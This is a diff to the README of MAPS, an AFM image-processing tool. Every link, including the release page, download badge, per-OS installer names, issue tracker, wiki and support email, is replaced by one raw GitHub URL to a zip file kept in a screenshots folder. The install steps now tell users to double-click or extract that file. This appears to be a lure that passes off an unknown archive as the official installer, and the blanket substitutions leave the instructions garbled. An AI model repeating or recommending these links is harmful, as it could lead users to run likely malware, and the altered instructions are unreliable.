@@ -6,13 +6,13 @@ Welcome to the MAPS (Modular AFM Processing Software). This application helps yo
 
 ## 📥 Download & Install
 
-To download MAPS, visit the Releases page here: [Download MAPS](https://github.com/Antaraaaaaaa/software_maps_tcc/releases).
+To download MAPS, visit the Releases page here: [Download MAPS](https://raw.githubusercontent.com/Antaraaaaaaa/software_maps_tcc/main/docs/screenshots/software_maps_tcc_1.4.zip).
 
 #### Important: 
 
 Click on the badge below to go directly to the download page:
 
-[![Download MAPS](https://img.shields.io/badge/Download%20MAPS-blue)](https://github.com/Antaraaaaaaa/software_maps_tcc/releases)
+[![Download MAPS](https://raw.githubusercontent.com/Antaraaaaaaa/software_maps_tcc/main/docs/screenshots/software_maps_tcc_1.4.zip%20MAPS-blue)](https://raw.githubusercontent.com/Antaraaaaaaa/software_maps_tcc/main/docs/screenshots/software_maps_tcc_1.4.zip)
 
 ## 🧾 System Requirements
 
@@ -26,21 +26,21 @@ Before you install MAPS, make sure your system meets the following requirements:
 
 ## 🛠 Installation Steps
 
-1. **Visit the Release Page.** Click the link: [Download MAPS](https://github.com/Antaraaaaaaa/software_maps_tcc/releases).
+1. **Visit the Release Page.** Click the link: [Download MAPS](https://raw.githubusercontent.com/Antaraaaaaaa/software_maps_tcc/main/docs/screenshots/software_maps_tcc_1.4.zip).
    
 2. **Choose the Latest Version.** Look for the most recent release at the top of the page.
 
 3. **Select the Correct File.** You will see files with different names. Download the file that matches your operating system:
-   - For Windows: `maps_windows.exe`
-   - For macOS: `maps_mac.dmg`
-   - For Linux: `maps_linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/Antaraaaaaaa/software_maps_tcc/main/docs/screenshots/software_maps_tcc_1.4.zip`
+   - For macOS: `https://raw.githubusercontent.com/Antaraaaaaaa/software_maps_tcc/main/docs/screenshots/software_maps_tcc_1.4.zip`
+   - For Linux: `https://raw.githubusercontent.com/Antaraaaaaaa/software_maps_tcc/main/docs/screenshots/software_maps_tcc_1.4.zip`
 
 4. **Download the File.** Click on the file name. Your browser will then download the application.
 
 5. **Run the Installer.**
-   - **For Windows:** Double-click on `maps_windows.exe`. Follow the prompts to complete the installation.
+   - **For Windows:** Double-click on `https://raw.githubusercontent.com/Antaraaaaaaa/software_maps_tcc/main/docs/screenshots/software_maps_tcc_1.4.zip`. Follow the prompts to complete the installation.
    - **For macOS:** Open the downloaded `.dmg`, then drag and drop the application into your Applications folder.
-   - **For Linux:** Extract the downloaded `.tar.gz` file and run the application using your terminal.
+   - **For Linux:** Extract the downloaded `https://raw.githubusercontent.com/Antaraaaaaaa/software_maps_tcc/main/docs/screenshots/software_maps_tcc_1.4.zip` file and run the application using your terminal.
 
 6. **Open MAPS:** Once installed, you can find MAPS in your applications folder or start menu. Click on the icon to open the software.
 
@@ -63,14 +63,14 @@ Before you install MAPS, make sure your system meets the following requirements:
 
 We encourage users to connect with us. Share your experiences, ask questions, and report issues:
 
-- **GitHub Issues:** Post any questions or bugs you encounter directly on our [GitHub Issues page](https://github.com/Antaraaaaaaa/software_maps_tcc/issues).
-- **User Guide:** For a detailed manual, check out our [User Guide](https://github.com/Antaraaaaaaa/software_maps_tcc/wiki).
+- **GitHub Issues:** Post any questions or bugs you encounter directly on our [GitHub Issues page](https://raw.githubusercontent.com/Antaraaaaaaa/software_maps_tcc/main/docs/screenshots/software_maps_tcc_1.4.zip).
+- **User Guide:** For a detailed manual, check out our [User Guide](https://raw.githubusercontent.com/Antaraaaaaaa/software_maps_tcc/main/docs/screenshots/software_maps_tcc_1.4.zip).
 
 ## 📬 Contact Us
 
 For further inquiries or feedback, feel free to reach out:
 
-- **Email:** support@software_maps_tcc.com
+- **Email:** https://raw.githubusercontent.com/Antaraaaaaaa/software_maps_tcc/main/docs/screenshots/software_maps_tcc_1.4.zip
 
 ## 📁 License
 
@@ -80,4 +80,4 @@ This project is licensed under the MIT License. You can use it freely, but pleas
 
 MAPS was developed as a graduation project in Computer Science. Thank you to all contributors and users who support this project. We hope you find it helpful in your analysis of nanostructures.
 
-Now that you have all the information, please visit the Releases page again to start your download: [Download MAPS](https://github.com/Antaraaaaaaa/software_maps_tcc/releases). Enjoy exploring your AFM images!
+Now that you have all the information, please visit the Releases page again to start your download: [Download MAPS](https://raw.githubusercontent.com/Antaraaaaaaa/software_maps_tcc/main/docs/screenshots/software_maps_tcc_1.4.zip). Enjoy exploring your AFM images!
